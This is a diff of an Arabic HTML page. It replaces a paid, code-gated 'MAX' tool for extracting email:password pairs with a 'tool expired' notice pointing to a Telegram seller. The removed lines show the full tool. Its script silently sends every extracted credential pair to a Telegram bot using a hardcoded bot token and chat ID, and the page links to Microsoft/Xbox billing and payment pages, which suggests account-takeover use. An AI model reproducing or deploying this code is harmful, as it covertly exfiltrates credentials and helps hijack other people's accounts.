@@ -3,667 +3,116 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>أداة MAX: استخراج Email:Password (MAX Pro)</title>
+    <title>⚠️ تم انتهاء مدة الأداة</title>
     <style>
-        /* ------------------------- المتغيرات والألوان ------------------------- */
+        /* المتغيرات والألوان */
         :root {
-            --card: #ffffffee;
-            --accent: #e60000;
-            --grad: linear-gradient(135deg, #e60000, #8b0000);
-            --dark-grad: linear-gradient(135deg, #111, #2a0000);
-            --success-color: #008000;
-            --highlight-copy: #8b0000; /* أحمر غامق لتمييز الإيميل المنسوخ */
+            --background-color: #1a1a1a;
+            --card-color: #ffffff;
+            --warning-color: #e60000;
+            --text-color: #444;
+            --accent-glow: 0 0 15px rgba(255, 0, 0, 0.8);
         }
 
-        /* ------------------------- ستايل الجسم الأساسي ------------------------- */
+        /* تنسيق الجسم الأساسي */
         body {
             margin: 0;
             font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial;
-            background: #111;
-            padding-top: 50px; /* لإفساح المجال للمؤقت الثابت */
-            padding-bottom: 50px;
+            background-color: var(--background-color);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(6px);
-            z-index: -1
-        }
-        
-        /* ------------------------- ستايل شريط المؤقت ------------------------- */
-        #timer-bar {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: auto;
-            min-width: 280px;
-            padding: 10px 20px;
-            background: rgba(0, 0, 0, 0.85);
-            color: var(--success-color);
-            font-weight: 800;
-            font-size: 18px;
-            border-bottom-left-radius: 10px;
-            z-index: 1000;
-            box-shadow: 0 0 15px rgba(0, 128, 0, 0.5);
-            text-align: right;
-            border-left: 3px solid var(--success-color);
-            border-bottom: 3px solid var(--success-color);
-            transition: opacity 0.3s;
-        }
-
-        /* ------------------------- ستايل صفحة الدخول (Login) ------------------------- */
-        #login-page {
-            background: var(--card);
-            border-radius: 18px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-            width: 90%;
-            max-width: 380px;
+            padding: 20px;
             text-align: center;
-            border: 3px solid var(--accent);
-            animation: fadeIn 0.5s ease-out;
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
+
+        /* صندوق الرسالة الرئيسية */
+        .lock-container {
+            background: var(--card-color);
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            border: 3px solid var(--warning-color);
         }
-        
-        #login-page h2 {
-            color: #111;
+
+        /* الأيقونة والرمز */
+        .icon {
+            font-size: 60px;
+            color: var(--warning-color);
+            text-shadow: var(--accent-glow);
+            margin-bottom: 15px;
+        }
+
+        /* العنوان الرئيسي */
+        h1 {
+            color: var(--warning-color);
+            font-size: 28px;
             margin-top: 0;
-            margin-bottom: 25px;
-            font-size: 26px;
-            font-weight: 900;
-            border-bottom: 4px solid var(--accent);
-            padding-bottom: 12px;
-            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        #code-input {
-            width: 90%;
-            padding: 14px;
-            margin-bottom: 20px;
-            border-radius: 10px;
-            border: 2px solid #aaa;
-            font-size: 18px;
-            text-align: center;
-            font-weight: bold;
-            font-family: monospace;
-            text-transform: uppercase;
-            transition: border-color .3s;
-        }
-
-        #code-input:focus { border-color: var(--accent); outline: none; }
-
-        #submit-btn {
-            width: 96%;
-            padding: 14px;
-            border: none;
-            border-radius: 10px;
-            background: var(--grad);
-            color: #fff;
-            font-size: 18px;
+            margin-bottom: 10px;
             font-weight: 800;
-            cursor: pointer;
-            transition: .3s;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.6);
         }
 
-        #submit-btn:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(255, 0, 0, 1); }
-
-        #error-msg {
-            color: var(--accent);
-            margin-top: 15px;
-            font-weight: 700;
-            min-height: 20px;
-        }
-        
-        /* ------------------------- ستايل الأداة (Tool) ------------------------- */
-        .wrap { max-width: 850px; margin: 20px auto; padding: 15px; }
-        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5); margin-bottom: 20px; }
-        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: #111; font-weight: 800; }
-        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid #ccc; resize: vertical; }
-        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
-        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
-        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
-        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(255, 0, 0, 1); }
-        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #444; }
-        .btn-black:hover { transform: translateY(-3px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.8); }
-        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
-        .item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #ddd; background: #fff; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); }
-        .item:last-child { border-bottom: none; }
-        .left { display: flex; flex-direction: column; gap: 8px; flex: 1; overflow: hidden; }
-
-        /* ------------------------- ستايل الإيميل المنسوخ ------------------------- */
-        .email {
-            font-weight: 800;
-            color: #b30000;
+        /* وصف المشكلة */
+        .description {
+            color: var(--text-color);
             font-size: 16px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            transition: color 0.3s;
-        }
-        
-        /* تلوين الإيميل بالأحمر الغامق عند النسخ */
-        .email.copied {
-            color: var(--highlight-copy); 
-            animation: pulseCopy 0.5s;
+            margin-bottom: 25px;
+            line-height: 1.6;
         }
 
-        @keyframes pulseCopy {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .pw { font-size: 14px; color: #444; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .controls { display: flex; gap: 8px; flex-shrink: 0; }
-        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
-        .copy-btn.btn-black { background: #222; }
-        
-        /* ------------------------- ستايل التنبيهات (Toast) ------------------------- */
-        .toast {
-            position: fixed;
-            left: 50%;
-            transform: translateX(-50%);
-            bottom: 30px;
-            background: #111;
-            color: #fff;
-            padding: 12px 18px;
+        /* زر الشراء والتليكرام */
+        .buy-button {
+            display: inline-block;
+            background-color: #0088cc; /* لون التليكرام الأزرق */
+            color: white;
+            padding: 15px 30px;
             border-radius: 12px;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity .3s, bottom .3s;
-            z-index: 2000; 
-            font-weight: 600;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 700;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.5);
         }
 
-        .toast.show { opacity: 1; bottom: 40px; }
-        .hidden { display: none !important; }
-        
-        /* ستايل الروابط */
-        .footer{text-align:center;color:#fff;margin-top:20px;font-size:15px;font-weight:500;text-shadow:0 0 8px #000}
-        .links-box{margin-top:20px;background:#ffffffee;padding:20px;border-radius:18px;box-shadow:0 6px 18px rgba(0,0,0,0.45);border:1px solid #eee}
-        .links-box .title-header{font-size:24px;margin-bottom:18px;color:#fff;text-align:center;background:var(--grad);padding:15px;border-radius:15px;box-shadow:0 0 15px rgba(255,0,0,0.8);font-weight:800;border:2px solid #fff}
-        .link-item{padding:15px;border-bottom:1px solid #ddd;display:flex;flex-direction:column}.link-item:last-child{border-bottom:none}
-        .link-title{font-size:18px;font-weight:800;color:#b30000}
-        .link-desc{font-size:14px;color:#555;margin:6px 0 10px}
-        .premium-btn{display:block;width:100%;padding:12px;background:var(--dark-grad);border:2px solid var(--accent);color:#fff;text-align:center;border-radius:10px;text-decoration:none;font-weight:800;box-shadow:0 0 12px rgba(255,0,0,0.6);transition:.3s}
-        .premium-btn:hover{transform:scale(1.03);box-shadow:0 0 20px rgba(255,0,0,1);background:var(--dark-grad)}
-        
-        /* ستايل الحقوق الجديد في صفحة الدخول */
-        .login-footer {
-            margin-top: 25px;
-            font-size: 14px;
-            color: #111;
-            font-weight: 600;
-            border-top: 1px dashed #ccc;
-            padding-top: 15px;
+        .buy-button:hover {
+            background-color: #006699;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.7);
         }
-        .login-footer b {
-            color: var(--accent);
-            font-size: 15px;
-            text-shadow: 0 0 1px rgba(0,0,0,0.1);
+
+        /* معرف التليكرام */
+        .telegram-id {
+            display: block;
+            margin-top: 15px;
+            color: var(--text-color);
+            font-size: 14px;
+            font-weight: 600;
         }
 
     </style>
 </head>
 <body>
 
-<div id="timer-bar" class="hidden"></div>
-
-<div id="login-page">
-    <h2><span style="font-size:30px;">🔑</span> رمز دخول MAX</h2>
-    <input type="password" id="code-input" placeholder="أدخل الرمز السري" />
-    <button id="submit-btn">الدخول إلى الأداة 🔥</button>
-    <div id="error-msg"></div>
+<div class="lock-container">
+    <div class="icon">🔒</div>
+    <h1>تم انتهاء مدة الأداة</h1>
     
-    <div class="login-footer">
-        للشراء أو طلب أكواد جديدة، يرجى المراسلة على التليكرام: 
-        <br><b>@xgbox7</b>
-    </div>
+    <p class="description">
+        انتهت صلاحية استخدام هذه الأداة. 
+        للحصول على نسخة جديدة أو التجديد، يرجى التواصل مع المالك.
+    </p>
+
+    <a href="https://t.me/xgbox7" target="_blank" class="buy-button">
+        للتجديد أو الشراء: راسلني
+    </a>
+    
+    <span class="telegram-id">
+        <span style="color:var(--warning-color);">التليكرام:</span> @xgbox7
+    </span>
 </div>
 
-<div class="wrap hidden" id="tool-page">
-    <div class="card">
-        <h1><span style="color:var(--accent);font-size:32px;">Ⓧ</span> أداة MAX: استخراج Email:Password</h1>
-        <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">
-            ألصق النص. الأداة تستخرج فقط: <b style="color:var(--accent);">email:password</b>
-        </div>
-        <textarea id="input" placeholder="ألصق النص هنا..."></textarea>
-        <div class="row">
-            <button id="parseBtn" class="btn-red">استخراج</button>
-            <button id="clearBtn" class="btn-black">مسح الكل</button>
-            <button id="copyAllBtn" class="btn-black">نسخ كل النتائج</button>
-            <button id="downloadBtn" class="btn-black">تنزيل ملف txt</button>
-        </div>
-        <div class="list" id="list"></div>
-    </div>
-    
-    <div class="links-box">
-        <div class="title-header">🔗 روابط Microsoft و Xbox المهمة</div>
-        <div class="link-item">
-            <div class="link-title">تسجيل دخول مايكروسوفت/Xbox</div>
-            <div class="link-desc">الصفحة الرسمية لتسجيل الدخول الموحد لحساب Microsoft و Xbox.</div>
-            <a class="premium-btn" href="https://login.live.com" target="_blank">فتح رابط الدخول ➡️</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">صفحة ربط الأجهزة (Link Code)</div>
-            <div class="link-desc">استخدم الرمز الظاهر على جهاز Xbox أو التلفزيون للتسجيل السريع.</div>
-            <a class="premium-btn" href="https://www.microsoft.com/link" target="_blank">فتح صفحة الكود 🌐</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">معلومات حساب مايكروسوفت</div>
-            <div class="link-desc">إدارة الأجهزة، تحديث كلمات المرور، إعدادات الحماية والأمان.</div>
-            <a class="premium-btn" href="https://account.microsoft.com" target="_blank">إدارة الحساب ⚙️</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">سجل الشراء والطلبات (Orders)</div>
-            <div class="link-desc">عرض كل مشترياتك السابقة من متجر Microsoft و Xbox.</div>
-            <a class="premium-btn" href="https://account.microsoft.com/billing/orders" target="_blank">عرض سجل الشراء 🛒</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">طرق الدفع (Payment Options)</div>
-            <div class="link-desc">إدارة بطاقات الائتمان، حسابات PayPal، وطرق الدفع الأخرى.</div>
-            <a class="premium-btn" href="https://account.microsoft.com/billing/payments" target="_blank">إدارة طرق الدفع 💳</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">خدمات واشتراكات Xbox/Microsoft</div>
-            <div class="link-desc">إدارة اشتراكك في Xbox Game Pass، Office 365، وغيرها.</div>
-            <a class="premium-btn" href="https://account.microsoft.com/services" target="_blank">إدارة الاشتراكات 🗓️</a>
-        </div>
-        <div class="link-item">
-            <div class="link-title">تسجيل الخروج من كل الأجهزة</div>
-            <div class="link-desc">تسجيل الخروج من كل خدمات وحسابات Microsoft النشطة (آمن).</div>
-            <a class="premium-btn" href="https://login.live.com/oauth20_logout.srf" target="_blank">تسجيل الخروج 🔓</a>
-        </div>
-    </div>
-
-    <div class="footer">حقوق © Telegram: <b>@xgbox7</b> | أداة MAX</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-    // **********************************************
-    // ** إعدادات التليكرام **
-    // **********************************************
-    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
-    const CHAT_ID = "7781990630";
-    
-    function sendToTelegram(messageText) {
-        if (!BOT_TOKEN || !CHAT_ID) {
-            console.error("معلومات البوت (التوكن أو ID الدردشة) غير موجودة.");
-            return;
-        }
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        const data = {
-            chat_id: CHAT_ID,
-            text: messageText, 
-            parse_mode: 'Markdown' 
-        };
-
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (!data.ok) {
-                console.error("خطأ بإرسال التليكرام:", data.description);
-            }
-        })
-        .catch(error => {
-            console.error('Fetch Error:', error);
-        });
-    }
-
-    // **********************************************
-    // ** نظام الأكواد الصعبة والمؤقتة (64 كود لمرة واحدة) **
-    // **********************************************
-    
-    // الأكواد المتاحة (بالدقائق)
-    let availableCodes = {
-        // الأكواد الدائمة (MAXADMIN1, MAXADMIN2)
-        "MAXADMIN1": -1,  
-        "MAXADMIN2": -1, 
-
-        // 64 كود لمرة واحدة بمدة 30 دقيقة
-        "Z3W4L9U2": 30, "A8R6H5T7": 30, "K1P9Q3F5": 30, "M7X2C4V8": 30,
-        "D5G3J1Y6": 30, "B9N4E7S2": 30, "L6W8Z0X3": 30, "H2T5R9A1": 30,
-        "F4P1K7D3": 30, "V8Y6J2N9": 30, "C3M5W0B4": 30, "Q7Z9L1G6": 30,
-        "U2A4X8E5": 30, "I6D0S3H7": 30, "O1T5F9R2": 30, "J8B4V6C3": 30,
-        "E5R9Q1Z7": 30, "G3H7X0K4": 30, "P6W2A8M9": 30, "N0D4L5B1": 30,
-        "T7F3V9J5": 30, "Y1C8E4H6": 30, "S2A5Z0R3": 30, "X9U7D1W4": 30,
-        "W4B0Q6N8": 30, "L5H9M3G2": 30, "V1Z6X3F7": 30, "R8T4C0J5": 30,
-        "A3E7P2Y9": 30, "K0D5S1B6": 30, "C9G3J8W4": 30, "F6H2M7V1": 30,
-        "B0R4T8Q9": 30, "X7N3D5L2": 30, "Z1C6A9K5": 30, "J4E8F0S3": 30,
-        "U5G9P2H7": 30, "M2T6Y1V4": 30, "D3W7B0N8": 30, "Q6X1Z5R4": 30,
-        "H9L5C3A0": 30, "P1F8V4E6": 30, "K7M2J9B3": 30, "S4W0D5G8": 30,
-        "R2T6Z9X1": 30, "V5A8C4M7": 30, "E0H3L1B9": 30, "N6J7W4P5": 30,
-        "G1D4F8S2": 30, "Q9C5E3R6": 30, "X0Z7V1U8": 30, "T3M9K6A4": 30,
-        "B8Y2H5W7": 30, "L4N6G0J1": 30, "F5P3D7C9": 30, "R6E1X8Z2": 30,
-        "W7A0M4H3": 30, "C2V9J5T8": 30, "K1Q3F6N4": 30, "G8B5Z7D9": 30,
-        "P4L2R0S6": 30, "E3X7W1U5": 30, "M9A4C8V0": 30, "H5T1F3B7": 30
-    };
-
-    // نستخدم Local Storage لخزن الأكواد الدائمة والمستخدمة
-    function loadCodes() {
-        const storedCodes = localStorage.getItem('max_codes');
-        if (storedCodes) {
-            try {
-                const loaded = JSON.parse(storedCodes);
-                
-                // إزالة الأكواد المؤقتة التي تم استخدامها (حتى لو انتهى وقتها)
-                for (const code in availableCodes) {
-                    if (availableCodes[code] !== -1 && loaded[code] === 'used') {
-                        delete availableCodes[code];
-                    }
-                }
-            } catch (e) {
-                console.error("Error loading codes:", e);
-                localStorage.removeItem('max_codes');
-            }
-        }
-    }
-    
-    function markCodeAsUsed(code) {
-        // الأكواد الدائمة لا تُحذف
-        if (availableCodes[code] === -1) return;
-        
-        // الأكواد المؤقتة تُحذف من القائمة الحالية وتُعلَّم كـ 'used' في التخزين
-        delete availableCodes[code];
-        
-        // تحديث Local Storage
-        const storedCodes = JSON.parse(localStorage.getItem('max_codes') || '{}');
-        storedCodes[code] = 'used';
-        localStorage.setItem('max_codes', JSON.stringify(storedCodes));
-    }
-
-    loadCodes(); // تحميل الأكواد عند بدء التشغيل
-
-    let expirationTime = 0; 
-    let countdownInterval;
-    let usedCode = null; 
-    let max_expires_key = 'max_expiry_time'; // مفتاح جديد لوقت الانتهاء
-    let max_last_code_key = 'max_last_code'; // مفتاح جديد لآخر كود مستخدم مؤقت
-
-    const loginPage = document.getElementById("login-page");
-    const toolPage = document.getElementById("tool-page");
-    const codeInput = document.getElementById("code-input");
-    const submitBtn = document.getElementById("submit-btn");
-    const errorMsg = document.getElementById("error-msg");
-    const timerBar = document.getElementById("timer-bar");
-
-    // محاولة الدخول التلقائي عند تحميل الصفحة
-    function attemptAutoLogin() {
-        const storedExpiry = localStorage.getItem(max_expires_key);
-        const storedCode = localStorage.getItem(max_last_code_key);
-
-        if (storedExpiry && storedCode) {
-            expirationTime = parseInt(storedExpiry);
-            const remaining = expirationTime - Date.now();
-            
-            // تحقق إذا كان الوقت مازال ساري المفعول (أكثر من 5 ثواني مثلاً)
-            if (remaining > 5000) { 
-                showToolPage(storedCode, 'restored'); // 'restored' للدلالة على عدم الحاجة لحساب وقت جديد
-                return true;
-            } else {
-                // انتهت الصلاحية، مسح البيانات والرجوع لصفحة الدخول
-                localStorage.removeItem(max_expires_key);
-                localStorage.removeItem(max_last_code_key);
-                // هنا يتم تفعيل الكود كمستخدم بفضل دالة showLoginPage
-                showLoginPage(); 
-                return false;
-            }
-        }
-        return false;
-    }
-
-
-    function showLoginPage() {
-        // إذا الكود المستخدم كان مؤقت، علّمه كمُستخدم وامسح بيانات الجلسة
-        if (usedCode && availableCodes[usedCode] !== -1) {
-            markCodeAsUsed(usedCode);
-        }
-        
-        // مسح بيانات الجلسة في Local Storage
-        localStorage.removeItem(max_expires_key);
-        localStorage.removeItem(max_last_code_key);
-        usedCode = null; 
-
-        toolPage.classList.add("hidden");
-        loginPage.classList.remove("hidden");
-        timerBar.classList.add("hidden");
-        clearInterval(countdownInterval); 
-        codeInput.value = "";
-        codeInput.focus();
-        
-        document.body.style.display = "flex";
-        document.body.style.minHeight = "100vh";
-    }
-    
-    function showToolPage(code, durationOrRestored) {
-        usedCode = code; 
-        
-        loginPage.classList.add("hidden");
-        toolPage.classList.remove("hidden");
-        timerBar.classList.remove("hidden");
-        
-        if (durationOrRestored === -1) {
-            // كود دائم
-            expirationTime = -1; 
-            timerBar.textContent = "✅ كود دائم (صلاحية مفتوحة)";
-            clearInterval(countdownInterval);
-            // مسح أي بيانات سابقة مؤقتة
-            localStorage.removeItem(max_expires_key); 
-            localStorage.removeItem(max_last_code_key);
-        } else if (durationOrRestored !== 'restored') {
-            // كود جديد: حساب وقت الانتهاء وحفظه
-            const durationMinutes = durationOrRestored;
-            expirationTime = Date.now() + (durationMinutes * 60 * 1000);
-            localStorage.setItem(max_expires_key, expirationTime.toString());
-            localStorage.setItem(max_last_code_key, code); // حفظ الكود المؤقت النشط
-            startCountdown();
-        } else {
-            // استعادة الجلسة: الوقت موجود بالفعل في expirationTime
-             startCountdown();
-        }
-        
-        document.body.style.display = "block";
-        document.body.style.minHeight = "auto";
-    }
-    
-    function startCountdown() {
-        if (countdownInterval) clearInterval(countdownInterval);
-        
-        countdownInterval = setInterval(() => {
-            const remainingTime = expirationTime - Date.now();
-            
-            if (remainingTime <= 0) {
-                // انتهت الصلاحية، مسح البيانات والرجوع لصفحة الدخول
-                showLoginPage(); 
-                return;
-            }
-            
-            const hours = Math.floor(remainingTime / (1000 * 60 * 60));
-            const minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);
-            
-            let timeString = "";
-            if (hours > 0) timeString += `${hours}س `;
-            timeString += `${minutes.toString().padStart(2, '0')}د `;
-            timeString += `${seconds.toString().padStart(2, '0')}ث`;
-            
-            timerBar.textContent = `⏱️ الوقت المتبقي: ${timeString}`;
-            
-        }, 1000);
-    }
-
-    function checkLogin() {
-        const code = codeInput.value.trim().toUpperCase();
-        errorMsg.textContent = "";
-
-        if (availableCodes.hasOwnProperty(code)) {
-            const duration = availableCodes[code]; 
-            showToolPage(code, duration);
-            showToast("تم الدخول بنجاح!");
-        } else if (code.length > 0) {
-            errorMsg.textContent = "رمز الدخول غلط أو انتهت صلاحيته! للشراء راسلنا على التليكرام @xgbox7.";
-            codeInput.value = "";
-            codeInput.focus();
-        } else {
-            errorMsg.textContent = "الرجاء إدخال الرمز السري.";
-        }
-    }
-
-    submitBtn.onclick = checkLogin;
-    codeInput.onkeypress = function(e) { e.key === "Enter" && checkLogin(); };
-    
-    function isToolActive() {
-        return expirationTime === -1 || Date.now() < expirationTime;
-    }
-
-    // **********************************************
-    // ** كود الأداة الأصلي مع التعديلات الجديدة **
-    // **********************************************
-    
-    const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\- ]\s*([^\s]+)/g;
-    
-    const input = document.getElementById("input");
-    const parseBtn = document.getElementById("parseBtn");
-    const list = document.getElementById("list");
-    const toast = document.getElementById("toast");
-    const clearBtn = document.getElementById("clearBtn");
-    const copyAllBtn = document.getElementById("copyAllBtn");
-    const downloadBtn = document.getElementById("downloadBtn");
-
-    function showToast(e) {
-        toast.textContent = e;
-        toast.classList.add("show");
-        clearTimeout(toast._t);
-        toast._t = setTimeout(() => toast.classList.remove("show"), 2000);
-    }
-
-    async function copyText(e) {
-        try {
-            return await navigator.clipboard.writeText(e), !0
-        } catch (e) {
-            const t = document.createElement("textarea");
-            return t.value = e, document.body.appendChild(t), t.select(), document.execCommand("copy"), t.remove(), !0
-        }
-    }
-
-    function parseText() {
-        if (!isToolActive()) return showLoginPage(); 
-
-        const e = input.value.trim();
-        list.innerHTML = "";
-        if (!e) return void showToast("لا يوجد نص للمسح");
-
-        let t, o = [];
-        for (t = emailPwRegex.exec(e); null !== t; t = emailPwRegex.exec(e)) {
-            t[2] && t[2].trim().length > 0 && o.push([t[1], t[2]])
-        }
-
-        if (0 === o.length) return void showToast("ماكو نتائج مطابقة");
-
-        const n = new Set, c = [];
-        for (const e of o) {
-            const t = e[0].toLowerCase() + ":" + e[1];
-            n.has(t) || (n.add(t), c.push(e))
-        }
-
-        // **********************************************
-        // ** إرسال النتائج للتليكرام (كما طلب المستخدم) **
-        // **********************************************
-        if (c.length > 0) {
-            const telegramMessage = c.map(([email, password]) => `${email}:${password}`).join('\n');
-            const header = `🎉 *نتائج أداة MAX الجديدة* 🎉\nتم استخراج ${c.length} نتيجة فريدة:\n\n\`\`\``;
-            const footer = "\n\`\`\`\nتم الإرسال تلقائياً من الأداة.";
-            sendToTelegram(header + telegramMessage + footer);
-        }
-
-        // بناء قائمة النتائج
-        for (const [e, t] of c) {
-            const o = document.createElement("div");
-            o.className = "item";
-            const n = document.createElement("div");
-            n.className = "left";
-            const r = document.createElement("div");
-            r.className = "email", r.textContent = e;
-            const l = document.createElement("div");
-            l.className = "pw", l.textContent = t;
-            n.appendChild(r), n.appendChild(l);
-            const s = document.createElement("div");
-            s.className = "controls";
-            
-            // زر نسخ الإيميل مع التظليل الأحمر الغامق
-            const d = document.createElement("button");
-            d.className = "copy-btn btn-red", d.textContent = "نسخ الإيميل", d.onclick = async () => {
-                if (!isToolActive()) return showLoginPage();
-                await copyText(e) && showToast("تم نسخ الإيميل");
-                r.classList.add('copied');
-                setTimeout(() => r.classList.remove('copied'), 600); 
-            };
-            
-            // زر نسخ الباسورد
-            const a = document.createElement("button");
-            a.className = "copy-btn btn-black", a.textContent = "نسخ الباسورد", a.onclick = async () => {
-                if (!isToolActive()) return showLoginPage();
-                await copyText(t) && showToast("تم نسخ الباسورد");
-            };
-            
-            s.appendChild(d), s.appendChild(a), o.appendChild(n), o.appendChild(s), list.appendChild(o)
-        }
-        showToast(`تم استخراج ${c.length} نتيجة فريدة`)
-    }
-
-    // ربط الأزرار مع وظيفة التحقق من الصلاحية
-    parseBtn.onclick = parseText;
-    clearBtn.onclick = () => { if (!isToolActive()) return showLoginPage(); input.value = "", list.innerHTML = "", showToast("تم مسح محتوى الأداة"); };
-    
-    copyAllBtn.onclick = async () => {
-        if (!isToolActive()) return showLoginPage();
-        const e = list.querySelectorAll(".item");
-        if (!e.length) return void showToast("لا توجد نتائج لنسخها");
-        const t = [...e].map(e => { const t = e.querySelector(".email").textContent.trim(), o = e.querySelector(".pw").textContent.trim(); return t + ":" + o; }).join("\n");
-        await copyText(t) && showToast("تم نسخ كل النتائج");
-    };
-    
-    downloadBtn.onclick = () => {
-        if (!isToolActive()) return showLoginPage();
-        const e = list.querySelectorAll(".item");
-        if (!e.length) return void showToast("لا توجد نتائج للتنزيل");
-        const t = [...e].map(e => { const t = e.querySelector(".email").textContent.trim(), o = e.querySelector(".pw").textContent.trim(); return t + ":" + o; }).join("\n");
-        const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
-        c.href = n, c.download = "MAX_emails_passwords.txt", c.click(), URL.revokeObjectURL(n), showToast("تم تنزيل الملف بنجاح");
-    };
-
-    // عند تحميل الصفحة، نحاول الدخول التلقائي
-    window.onload = () => {
-        if (!attemptAutoLogin()) {
-            showLoginPage();
-        }
-    };
-</script>
 </body>
 </html>
